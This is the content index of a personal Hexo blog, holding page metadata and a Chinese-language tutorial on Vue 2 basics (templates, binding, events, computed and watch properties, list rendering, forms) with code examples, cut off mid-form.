{"meta":{"title":"Serein's blog","subtitle":"","description":"热爱大前端并怀揣着梦想","author":"Serein","url":"https://serein.icu","root":"/"},"pages":[{"title":"分类","date":"2020-11-24T07:12:19.000Z","updated":"2021-07-26T14:44:28.785Z","comments":false,"path":"categories/index.html","permalink":"https://serein.icu/categories/index.html","excerpt":"","text":""},{"title":"关于本站","date":"2022-03-10T15:19:56.000Z","updated":"2022-03-10T15:19:55.403Z","comments":false,"path":"about/index.html","permalink":"https://serein.icu/about/index.html","excerpt":"","text":"Serein“ 认识自我、超越自我 “ 那么你离成功就又进了一步！ 当你感觉所要学习的人和事越来越多时，说明你在 成长 。 当你感觉要责怪的人和事越来越少时，说明你在 成熟 。 当你在不断获得了友谊和朋友时，说明你将取得 成功 。 联系我B站：爆炸吧-现充（bilibili YYDS !） QQ：1297711534 (间接性失联) 座右铭：既然选择了远方 便只顾风雨兼程"},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2022-03-13T03:14:57.264Z","comments":true,"path":"archives/index.html","permalink":"https://serein.icu/archives/index.html","excerpt":"","text":""},{"title":"我的歌单","date":"2019-05-17T08:14:00.000Z","updated":"2021-07-26T13:06:52.537Z","comments":true,"path":"music/index.html","permalink":"https://serein.icu/music/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-06-07T14:17:49.000Z","updated":"2021-07-27T07:31:10.990Z","comments":true,"path":"link/index.html","permalink":"https://serein.icu/link/index.html","excerpt":"","text":""},{"title":"留言板","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-23T10:50:01.880Z","comments":false,"path":"comments/index.html","permalink":"https://serein.icu/comments/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-11-24T07:14:39.000Z","updated":"2021-07-26T14:44:42.337Z","comments":false,"path":"tags/index.html","permalink":"https://serein.icu/tags/index.html","excerpt":"","text":""},{"title":"","date":"2019-08-10T08:41:10.000Z","updated":"2022-03-11T06:56:26.059Z","comments":false,"path":"List/movies/index.html","permalink":"https://serein.icu/List/movies/index.html","excerpt":"","text":"奥斯卡最佳动画短片《鹬》（Piper）"},{"title":"","date":"2022-03-12T03:23:13.000Z","updated":"2022-03-13T03:23:35.157Z","comments":false,"path":"List/gallery/wallpaper/index.html","permalink":"https://serein.icu/List/gallery/wallpaper/index.html","excerpt":"","text":""},{"title":"Music-BOX","date":"2020-04-23T04:58:56.000Z","updated":"2022-03-11T06:18:21.494Z","comments":false,"path":"List/music/index.html","permalink":"https://serein.icu/List/music/index.html","excerpt":"","text":""},{"title":"相册","date":"2022-03-13T03:18:40.109Z","updated":"2022-03-13T03:18:40.109Z","comments":false,"path":"List/gallery/index.html","permalink":"https://serein.icu/List/gallery/index.html","excerpt":"","text":"壁紙 /List/gallery/wallpaper"}],"posts":[{"title":"Vue2基础知识","slug":"02-Vue2基础知识","date":"2022-03-14T01:00:00.000Z","updated":"2022-03-14T00:57:35.052Z","comments":true,"path":"posts/2.html","link":"","permalink":"https://serein.icu/posts/2.html","excerpt":"","text":"基础知识篇一、初识Vue 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象； root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法； root容器里的代码被称为【Vue模板】； Vue实例和容器是一一对应的； 真实开发中只有一个Vue实例，并且会配合着组件一起使用； 中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性； 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新； 注意区分：js表达式 和 js代码(语句) 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方： a a+b demo(1) x === y ? 'a' : 'b' js代码(语句) if(){} for(){} 二、Vue模板语法Vue模板语法有两大类： 插值语法： 功能：用于解析标签体内容。 写法：，xxx是js表达式，且可以直接读取到data中的所有属性。 指令语法： 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件…..）。 举例：v-bind:href=”xxx” 或 简写为 :href=”xxx”，xxx同样要写js表达式，且可以直接读取到data中的所有属性。 备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。 &lt;!-- 准备好一个容器--&gt; &lt;div id=\"root\"&gt; &lt;h1&gt;插值语法&lt;/h1&gt; &lt;h3&gt;你好，{{name}}&lt;/h3&gt; &lt;hr/&gt; &lt;h1&gt;指令语法&lt;/h1&gt; &lt;a v-bind:href=\"school.url.toUpperCase()\" x=\"hello\"&gt;点我去{{school.name}}学习1&lt;/a&gt; &lt;a :href=\"school.url\" x=\"hello\"&gt;点我去{{school.name}}学习2&lt;/a&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。 new Vue({ el:'#root', data:{ name:'Serein', school:{ name:\"Serein'blog\", url:'https://www.serein.icu', } } }) &lt;/script&gt; 三、数据绑定Vue中有2种数据绑定的方式： 单向绑定(v-bind)：数据只能从data流向页面。 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。 备注：1. 双向绑定一般都应用在表单类元素上（如：input、select等）2. v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。 &lt;div id=\"root\"&gt; &lt;!-- 普通写法 --&gt; &lt;!-- 单向数据绑定：&lt;input type=\"text\" v-bind:value=\"name\"&gt;&lt;br/&gt; 双向数据绑定：&lt;input type=\"text\" v-model:value=\"name\"&gt;&lt;br/&gt; --&gt; &lt;!-- 简写 --&gt; 单向数据绑定：&lt;input type=\"text\" :value=\"name\"&gt;&lt;br/&gt; 双向数据绑定：&lt;input type=\"text\" v-model=\"name\"&gt;&lt;br/&gt; &lt;!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 --&gt; &lt;!-- &lt;h2 v-model:x=\"name\"&gt;你好啊&lt;/h2&gt; --&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。 new Vue({ el:'#root', data:{ name:'Serein' } }) &lt;/script&gt; 四、el与data的两种写法1. el有2种写法： new Vue时候配置el属性。 先创建Vue实例，随后再通过vm.$mount(‘#root’)指定el的值。 2. data有2种写法： 对象式 函数式 如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。 3. 一个重要的原则： 由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。 &lt;div id=\"root\"&gt; &lt;h1&gt;你好，{{name}}&lt;/h1&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。 //el的两种写法 const v = new Vue({ //el:'#root', //第一种写法 data:{ name:'Serein' } }) console.log(v) v.$mount('#root') //第二种写法 //data的两种写法 new Vue({ el:'#root', //data的第一种写法：对象式 data:{ name:'Serein' } //data的第二种写法：函数式 data(){ console.log('@@@',this) //此处的this是Vue实例对象 return{ name:'Serein' } } }) &lt;/script&gt; 五、MVVM模型1. M：模型(Model) ：data中的数据 2. V：视图(View) ：模板代码 3. VM：视图模型(ViewModel)：Vue实例 观察发现： - data中所有的属性，最后都出现在了vm身上。 - vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。 &lt;div id=\"root\"&gt; &lt;h1&gt;学校名称：{{name}}&lt;/h1&gt; &lt;h1&gt;学校地址：{{address}}&lt;/h1&gt; &lt;h1&gt;测试一下1：{{1+1}}&lt;/h1&gt; &lt;h1&gt;测试一下2：{{$options}}&lt;/h1&gt; &lt;h1&gt;测试一下3：{{$emit}}&lt;/h1&gt; &lt;h1&gt;测试一下4：{{_c}}&lt;/h1&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。 const vm = new Vue({ el:'#root', data:{ name:'Serein', address:\"Serein's blog\", } }) console.log(vm) &lt;/script&gt; 六、数据代理1. 回顾Object.defineProperty&lt;script type=\"text/javascript\" &gt; let number = 18 let person = { name:'张三', sex:'男', } Object.defineProperty(person,'age',{ // value:18, enumerable:true, //控制属性是否可以枚举，默认值是false writable:true, //控制属性是否可以被修改，默认值是false configurable:true //控制属性是否可以被删除，默认值是false //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值 get(){ console.log('有人读取age属性了') return number }, //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值 set(value){ console.log('有人修改了age属性，且值是',value) number = value } }) console.log(Object.keys(person)) //枚举person对象属性 console.log(person) &lt;/script&gt; 2. 何为数据代理&lt;!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）--&gt; &lt;script type=\"text/javascript\" &gt; let obj = {x:100} let obj2 = {y:200} Object.defineProperty(obj2,'x',{ get(){ return obj.x }, set(value){ obj.x = value } }) &lt;/script&gt; 3.Vue中的数据代理1. Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写） 2. Vue中数据代理的好处：更加方便的操作data中的数据 3. 基本原理：通过Object.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性。 &lt;div id=\"root\"&gt; &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt; &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ name:'Serein', address:\"Serein's blog\" } }) &lt;/script&gt; 七、事件处理1. 事件的基本使用 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名； 事件的回调需要配置在methods对象中，最终会在vm上； methods中配置的函数，不要用箭头函数！否则this就不是vm了； methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象； @click=”demo” 和 @click=”demo($event)” 效果一致，但后者可以传参； &lt;div id=\"root\"&gt; &lt;h2&gt;欢迎来到{{name}}学习&lt;/h2&gt; &lt;!-- &lt;button v-on:click=\"showInfo\"&gt;点我提示信息&lt;/button&gt; --&gt; &lt;button @click=\"showInfo1\"&gt;点我提示信息1（不传参）&lt;/button&gt; &lt;button @click=\"showInfo2($event,66)\"&gt;点我提示信息2（传参）&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ name:'Serein', }, methods:{ showInfo1(event){ console.log(event.target.innerText) //获取按钮的文字数据 console.log(this) //此处的this是vm alert('同学你好！') }, showInfo2(event,number){ console.log(event,number) console.log(event.target.innerText) console.log(this) //此处的this是vm alert('同学你好！！') } } }) &lt;/script&gt; 2. 事件修饰符 prevent：阻止默认事件（常用）； stop：阻止事件冒泡（常用）； once：事件只触发一次（常用）； capture：使用事件的捕获模式； self：只有event.target是当前操作的元素时才触发事件； passive：事件的默认行为立即执行，无需等待事件回调执行完毕；（一般移动端使用它） 注意：passive和prevent冲突，不能同时绑定在一个监听器上。 事件冒泡： 即事件开始时由最具体的元素接收，然后逐级向上传播到较为不具体的节点 理解：想象气泡从水底开始往上升，由深到浅，升到最上面。在上升的过程中，气泡会经过不同深度层次的水。 相对应地：这个气泡就相当于我们这里的事件，而水则相当于我们的整个dom树；事件从dom 树的底层 层层往上传递，直至传递到dom的根节点。 事件捕获： 与事件冒泡完全相反 网景公司提出的事件流叫事件捕获流 事件捕获流的思想是不太具体的DOM节点应该更早接收到事件，而最具体的节点应该最后接收到事件 懵懵懂懂的小伙伴，请看图解: &lt;div id=\"root\"&gt; &lt;h2&gt;欢迎来到{{name}}学习&lt;/h2&gt; &lt;!-- 阻止默认事件（常用） --&gt; &lt;a href=\"https://www.serein.icu/\" @click.prevent=\"showInfo\"&gt;点我提示信息&lt;/a&gt; &lt;!-- 阻止事件冒泡（常用） --&gt; &lt;div class=\"demo1\" @click=\"showInfo\"&gt; &lt;button @click.stop=\"showInfo\"&gt;点我提示信息&lt;/button&gt; &lt;!-- 修饰符可以连续写 --&gt; &lt;!-- &lt;a href=\"https://www.serein.icu/\" @click.prevent.stop=\"showInfo\"&gt;点我提示信息&lt;/a&gt; --&gt; &lt;/div&gt; &lt;!-- 事件只触发一次（常用） --&gt; &lt;button @click.once=\"showInfo\"&gt;点我提示信息&lt;/button&gt; &lt;!-- 使用事件的捕获模式 --&gt; &lt;div class=\"box1\" @click.capture=\"showMsg(1)\"&gt; div1 &lt;div class=\"box2\" @click=\"showMsg(2)\"&gt; div2 &lt;/div&gt; &lt;/div&gt; &lt;!-- 只有event.target是当前操作的元素时才触发事件； --&gt; &lt;div class=\"demo1\" @click.self=\"showInfo\"&gt; &lt;button @click=\"showInfo\"&gt;点我提示信息&lt;/button&gt; &lt;/div&gt; &lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； --&gt; //wheel(scroll) 滚动鼠标滚轮(滚动条)触发事件 &lt;ul @wheel.passive=\"demo\" class=\"list\"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ name:'Serein' }, methods:{ showInfo(e){ alert('同学你好！') console.log(e.target) }, showMsg(msg){ console.log(msg) }, demo(){ for (let i = 0; i &lt; 100000; i++) { console.log('#') } console.log('累坏了') } } }) &lt;/script&gt; 3. 键盘事件1. Vue中常用的按键别名： 回车 =&gt; enter 删除 =&gt; delete (捕获“删除”和“退格”键) 退出 =&gt; esc 空格 =&gt; space 换行 =&gt; tab (特殊，必须配合keydown去使用) 上 =&gt; up 下 =&gt; down 左 =&gt; left 右 =&gt; right 2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名） 3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。 配合keydown使用：正常触发事件。 4. 也可以使用keyCode去指定具体的按键（不推荐，Vue3已弃用） 5. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名(Vue3已弃用) 八、计算属性computed 定义：要用的属性不存在，要通过已有属性计算得来。 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。 get函数什么时候执行？ 初次读取时会执行一次。 当依赖的数据发生改变时会被再次调用。 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。 备注： 计算属性最终会出现在vm上，直接读取使用即可。 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。 &lt;div id=\"root\"&gt; 姓：&lt;input type=\"text\" v-model=\"firstName\"&gt; &lt;br/&gt;&lt;br/&gt; 名：&lt;input type=\"text\" v-model=\"lastName\"&gt; &lt;br/&gt;&lt;br/&gt; 全名：&lt;span&gt;{{fullName}}&lt;/span&gt; &lt;br/&gt;&lt;br/&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ firstName:'张', lastName:'三', }, computed:{ //完整写法 fullName:{ //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值 //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。 get(){ console.log('get被调用了') console.log(this) //此处的this是vm return this.firstName + '-' + this.lastName }, //set什么时候调用? 当fullName被修改时。 set(value){ console.log('set',value) const arr = value.split('-') this.firstName = arr[0] this.lastName = arr[1] } } //简写 fullName(){ console.log('get被调用了') return this.firstName + '-' + this.lastName } } }) &lt;/script&gt; 九、监视属性watch 当被监视的属性变化时, 回调函数自动调用, 进行相关操作 监视的属性必须存在，才能进行监视！！ 监视的两种写法： new Vue时传入watch配置 通过vm.$watch监视 深度监视 Vue中的watch默认不监测对象内部值的改变（一层）。 配置deep:true可以监测对象内部值改变（多层）。 备注： Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！ 使用watch时根据数据的具体结构，决定是否采用深度监视。 &lt;div id=\"root\"&gt; &lt;h2&gt;今天天气很{{info}}&lt;/h2&gt; &lt;button @click=\"changeWeather\"&gt;切换天气&lt;/button&gt; &lt;hr/&gt; &lt;h3&gt;a的值是:{{numbers.a}}&lt;/h3&gt; &lt;button @click=\"numbers.a++\"&gt;点我让a+1&lt;/button&gt; &lt;h3&gt;b的值是:{{numbers.b}}&lt;/h3&gt; &lt;button @click=\"numbers.b++\"&gt;点我让b+1&lt;/button&gt; &lt;button @click=\"numbers = {a:666,b:888}\"&gt;彻底替换掉numbers&lt;/button&gt; {{numbers.c.d.e}} &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ isHot:true, numbers:{ a:1, b:1, c:{ d:{ e:100 } } } }, computed:{ info(){ return this.isHot ? '炎热' : '凉爽' } }, methods: { changeWeather(){ this.isHot = !this.isHot } }, watch:{ isHot:{ immediate:true, //初始化时让handler调用一下 //handler什么时候调用？当isHot发生改变时。 handler(newValue,oldValue){ console.log('isHot被修改了',newValue,oldValue) } }, // 简写 isHot(newValue,oldValue){ console.log('isHot被修改了',newValue,oldValue,this) } //监视多级结构中某个属性的变化 'numbers.a':{ handler(){ console.log('a被改变了') } } //监视多级结构中所有属性的变化 numbers:{ deep:true, handler(){ console.log('numbers改变了') } } } }) vm.$watch('isHot',{ immediate:true, handler(newValue,oldValue){ console.log('isHot被修改了',newValue,oldValue) } }) &lt;/script&gt; computed和watch之间的区别： computed能完成的功能，watch都可以完成。 watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。 两个重要的小原则： 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。 十、绑定样式 class样式 写法:class=”xxx” xxx可以是字符串、对象、数组。 字符串写法适用于：类名不确定，要动态获取。 数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。 对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。 style样式 :style=”{fontSize: xxx}”其中xxx是动态值。 :style=”[a,b]”其中a、b是样式对象。 &lt;style&gt; .basic{ width: 400px; height: 100px; border: 1px solid black; } .happy{ border: 4px solid red;; background-color: rgba(255, 255, 0, 0.644); background: linear-gradient(30deg,yellow,pink,orange,yellow); } .sad{ border: 4px dashed rgb(2, 197, 2); background-color: gray; } .normal{ background-color: skyblue; } .style1{ background-color: yellowgreen; } .style2{ font-size: 30px; text-shadow:2px 2px 10px red; } .style3{ border-radius: 20px; } &lt;/style&gt; &lt;div id=\"root\"&gt; &lt;!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt; &lt;div class=\"basic\" :class=\"mood\" @click=\"changeMood\"&gt;{{name}}&lt;/div&gt; &lt;br/&gt;&lt;br/&gt; &lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt; &lt;div class=\"basic\" :class=\"classArr\"&gt;{{name}}&lt;/div&gt; &lt;br/&gt;&lt;br/&gt; &lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt; &lt;div class=\"basic\" :class=\"classObj\"&gt;{{name}}&lt;/div&gt; &lt;br/&gt;&lt;br/&gt; &lt;!-- 绑定style样式--对象写法 --&gt; &lt;div class=\"basic\" :style=\"styleObj\"&gt;{{name}}&lt;/div&gt; &lt;br/&gt;&lt;br/&gt; &lt;!-- 绑定style样式--数组写法 --&gt; &lt;div class=\"basic\" :style=\"styleArr\"&gt;{{name}}&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ name:'Serein', mood:'normal', classArr:['style1','style2','style3'], classObj:{ style1:false, style2:false, }, styleObj:{ fontSize: '40px', color:'red', }, styleObj2:{ backgroundColor:'orange' }, styleArr:[ { fontSize: '40px', color:'blue', }, { backgroundColor:'gray' } ] }, methods: { changeMood(){ const arr = ['happy','sad','normal'] const index = Math.floor(Math.random()*3) this.mood = arr[index] } }, }) &lt;/script&gt; 十一、条件渲染 v-if写法： v-if=”表达式” v-else-if=”表达式” v-else=”表达式” 适用于：切换频率较低的场景。特点：不展示的DOM元素直接被移除。注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。 v-show写法：v-show=”表达式”适用于：切换频率较高的场景。特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。 &lt;div id=\"root\"&gt; &lt;h2&gt;当前的n值是:{{n}}&lt;/h2&gt; &lt;button @click=\"n++\"&gt;点我n+1&lt;/button&gt; &lt;!-- 使用v-show做条件渲染 --&gt; &lt;h2 v-show=\"false\"&gt;欢迎来到{{name}}&lt;/h2&gt; &lt;h2 v-show=\"1 === 1\"&gt;欢迎来到{{name}}&lt;/h2&gt; &lt;!-- 使用v-if做条件渲染 --&gt; &lt;h2 v-if=\"false\"&gt;欢迎来到{{name}}&lt;/h2&gt; &lt;h2 v-if=\"1 === 1\"&gt;欢迎来到{{name}}&lt;/h2&gt; &lt;!-- v-else和v-else-if --&gt; &lt;div v-if=\"n === 1\"&gt;Angular&lt;/div&gt; &lt;div v-else-if=\"n === 2\"&gt;React&lt;/div&gt; &lt;div v-else-if=\"n === 3\"&gt;Vue&lt;/div&gt; &lt;div v-else&gt;哈哈&lt;/div&gt; &lt;!-- v-if与template的配合使用 --&gt; &lt;template v-if=\"n === 1\"&gt; &lt;h2&gt;你好&lt;/h2&gt; &lt;h2&gt;Serein&lt;/h2&gt; &lt;h2&gt;Sereinblog&lt;/h2&gt; &lt;/template&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ name:'Serein', n:0 } }) &lt;/script&gt; 十二、列表渲染1. 基本列表v-for指令: 1. 用于展示列表数据 2. 语法：v-for=”(item, index) in xxx” :key=”yyy” 3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少） 2. key的原理react、vue中的key有什么作用？（key的内部原理） 虚拟DOM中key的作用： key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下： 对比规则： 旧虚拟DOM中找到了与新虚拟DOM相同的key： 若虚拟DOM中内容没变, 直接使用之前的真实DOM！ 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。 旧虚拟DOM中未找到与新虚拟DOM相同的key： 创建新的真实DOM，随后渲染到到页面。 用index作为key可能会引发的问题： 若对数据进行：逆序添加、逆序删除等破坏顺序操作:会产生没有必要的真实DOM更新 ==&gt; 界面效果没问题, 但效率低。 如果结构中还包含输入类的DOM：会产生错误DOM更新 ==&gt; 界面有问题。 开发中如何选择key?: 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。 图解 3. 列表过滤&lt;div id=\"root\"&gt; &lt;h2&gt;人员列表&lt;/h2&gt; &lt;input type=\"text\" placeholder=\"请输入名字\" v-model=\"keyWord\"&gt; &lt;ul&gt; &lt;li v-for=\"(p,index) of filPerons\" :key=\"index\"&gt; {{p.name}}-{{p.age}}-{{p.sex}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ keyWord:'', persons:[ {id:'001',name:'马冬梅',age:19,sex:'女'}, {id:'002',name:'周冬雨',age:20,sex:'女'}, {id:'003',name:'周杰伦',age:21,sex:'男'}, {id:'004',name:'温兆伦',age:22,sex:'男'} ] }, computed:{ filPerons(){ return this.persons.filter((p)=&gt;{ return p.name.indexOf(this.keyWord) !== -1 }) } } }) &lt;/script&gt; 4. 列表排序&lt;div id=\"root\"&gt; &lt;h2&gt;人员列表&lt;/h2&gt; &lt;input type=\"text\" placeholder=\"请输入名字\" v-model=\"keyWord\"&gt; &lt;button @click=\"sortType = 2\"&gt;年龄升序&lt;/button&gt; &lt;button @click=\"sortType = 1\"&gt;年龄降序&lt;/button&gt; &lt;button @click=\"sortType = 0\"&gt;原顺序&lt;/button&gt; &lt;ul&gt; &lt;li v-for=\"(p,index) of filPerons\" :key=\"p.id\"&gt; {{p.name}}-{{p.age}}-{{p.sex}} &lt;input type=\"text\"&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ keyWord:'', sortType:0, //0原顺序 1降序 2升序 persons:[ {id:'001',name:'马冬梅',age:30,sex:'女'}, {id:'002',name:'周冬雨',age:31,sex:'女'}, {id:'003',name:'周杰伦',age:18,sex:'男'}, {id:'004',name:'温兆伦',age:19,sex:'男'} ] }, computed:{ filPerons(){ const arr = this.persons.filter((p)=&gt;{ return p.name.indexOf(this.keyWord) !== -1 }) //判断一下是否需要排序 if(this.sortType){ arr.sort((p1,p2)=&gt;{ return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age }) } return arr } } }) &lt;/script&gt; 5. Vue的数据监测Vue监视数据的原理： vue会监视data中所有层次的数据。 如何监测对象中的数据？ 通过setter实现监视，且要在new Vue时就传入要监测的数据。 1. 对象中后追加的属性，Vue默认不做响应式处理 2. 如需给后添加的属性做响应式，请使用如下API： Vue.set(target，propertyName/index，value) 或 vm.$set(target，propertyName/index，value) 如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质就是做了两件事： 1. 调用原生对应的方法对数组进行更新。 2. 重新解析模板，进而更新页面。 在Vue修改数组中的某个元素一定要用如下方法： 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse() Vue.set() 或 vm.$set() 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！ &lt;div id=\"root\"&gt; &lt;h1&gt;学生信息&lt;/h1&gt; &lt;button @click=\"student.age++\"&gt;年龄+1岁&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"addSex\"&gt;添加性别属性，默认值：男&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"student.sex = '未知' \"&gt;修改性别&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"addFriend\"&gt;在列表首位添加一个朋友&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"updateFirstFriendName\"&gt;修改第一个朋友的名字为：张三&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"addHobby\"&gt;添加一个爱好&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"updateHobby\"&gt;修改第一个爱好为：开车&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"removeSmoke\"&gt;过滤掉爱好中的抽烟&lt;/button&gt; &lt;br/&gt; &lt;h3&gt;姓名：{{student.name}}&lt;/h3&gt; &lt;h3&gt;年龄：{{student.age}}&lt;/h3&gt; &lt;h3 v-if=\"student.sex\"&gt;性别：{{student.sex}}&lt;/h3&gt; &lt;h3&gt;爱好：&lt;/h3&gt; &lt;ul&gt; &lt;li v-for=\"(h,index) in student.hobby\" :key=\"index\"&gt; {{h}} &lt;/li&gt; &lt;/ul&gt; &lt;h3&gt;朋友们：&lt;/h3&gt; &lt;ul&gt; &lt;li v-for=\"(h,index) in student.hobby\" :key=\"index\"&gt; {{h}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ student:{ name:'tom', age:18, hobby:['抽烟','喝酒','烫头'], friends:[ {name:'jerry',age:35}, {name:'tony',age:36} ] } }, methods: { addSex(){ // Vue.set(this.student,'sex','男') this.$set(this.student,'sex','男') }, addFriend(){ this.student.friends.unshift({name:'jack',age:70}) }, updateFirstFriendName(){ this.student.friends[0].name = '张三' }, addHobby(){ this.student.hobby.push('学习') }, updateHobby(){ // this.student.hobby.splice(0,1,'开车') // Vue.set(this.student.hobby,0,'开车') this.$set(this.student.hobby,0,'开车') }, removeSmoke(){ this.student.hobby = this.student.hobby.filter((h)=&gt;{ return h !== '抽烟' }) } } }) &lt;/script&gt; 十三、搜集表单数据若：&lt;input type=\"text\"/&gt;，则v-model收集的是value值，用户输入的就是value值。 若：&lt;input type=\"radio\"/&gt;，则v-model收集的是value值，且要给标签配置value值。 若：&lt;input type=\"checkbox\"/&gt; 1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值） 2.配置input的value属性: (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值） (2)v-model的初始值是数组，那么收集的的就是value组成的数组 备注：v-model的三个修饰符： lazy：失去焦点再收集数据 number：输入字符串转为有效的数字 trim：输入首尾空格过滤 &lt;div id=\"root\"&gt; &lt;form @submit.prevent=\"demo\"&gt; 账号：&lt;input type=\"text\" v-model.trim=\"userInfo.account\"&gt; &lt;br/&gt;&lt;br/&gt; 密码：&lt;input type=\"password\" v-model=\"userInfo.password\"&gt; &lt;br/&gt;&lt;br/&gt; 年龄：&lt;input type=\"number\" v-model.number=\"userInfo.age\"&gt; &lt;br/&gt;&lt;br/&gt; 性别： 男&lt;input type=\"radio\" name=\"sex\" v-model=\"userInfo.sex\" value=\"male\"&gt; 女&lt;input type=\"radio\" name=\"sex\" v-model=\"userInfo.sex\" value=\"female\"&gt; &lt;br/&gt;&lt;br/&gt; 爱好： 学习&lt;input type=\"checkbox\" v-model=\"userInfo.hobby\" value=\"study\"&gt; 打游戏&lt;input type=\"checkbox\" v-model=\"userInfo.hobby\" value=\"game\"&gt; 吃饭&lt;input type=\"checkbox\" v-model=\"userInfo.hobby\" value=\"eat\"&gt; &lt;br/&gt;&lt;br/&gt; 所属校区 &lt;select v-model=\"userInfo.city\"&gt; &lt;option value=\"\"&gt;请选择校区&lt;/option&gt; &lt;option value=\"beijing\"&gt;Sereinblog&lt;/option&gt; &lt;option 